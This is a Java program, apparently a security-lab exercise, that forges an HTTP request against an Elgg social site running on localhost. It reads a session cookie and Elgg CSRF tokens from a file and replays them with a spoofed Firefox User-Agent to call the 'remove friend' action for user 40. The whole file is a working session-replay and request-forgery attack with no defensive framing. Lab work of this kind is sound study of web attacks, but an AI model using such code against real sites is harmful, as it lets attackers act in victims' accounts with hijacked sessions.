import java.io.*;
import java.net.*;
public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {

			int responseCode;

			// Extracts the file
			File file = new File("HTTPSimpleForge.txt");
			InputStream responseIn = new FileInputStream(file); 
			// Creates a reader or the input stream
			BufferedReader reader = new BufferedReader(new InputStreamReader(responseIn));
			String cookie = "";
			String requestDetails = "";
			// Reads each line of the file
			int i = 0;
			while (reader.ready()) {
				String line = reader.readLine();
				if (i == 0) {
					cookie = line;
				}
				else if (i == 1) {
					requestDetails += "&__elgg_ts=" + line;
				}
				else if (i == 2) {
					requestDetails += "&__elgg_token=" + line;
				}
				i += 1;
			}

			// URL to be forged.
			URL url = new URL ("http://localhost:41482/action/friends/remove?friend=40"+requestDetails);

			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}

			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
			urlConn.addRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			urlConn.addRequestProperty("Cookie", cookie);

			// The rest of the file sends the request and prints out the response.

			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlConn;
				// Contacts the web server and gets the status code from
				// HTTP Response message.
				responseCode = httpConn.getResponseCode();
				// System.out.println("Response Code = " + responseCode);
				// HTTP status code HTTP_OK means the response was
				// received sucessfully.
				if (responseCode == HttpURLConnection.HTTP_OK) {
					
					// Get the input stream from url connection object.
					responseIn = httpConn.getInputStream();
					BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));
					while (buf_inp.ready()) {
						String inputLine = buf_inp.readLine();
						System.out.println(inputLine);
					}
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
}
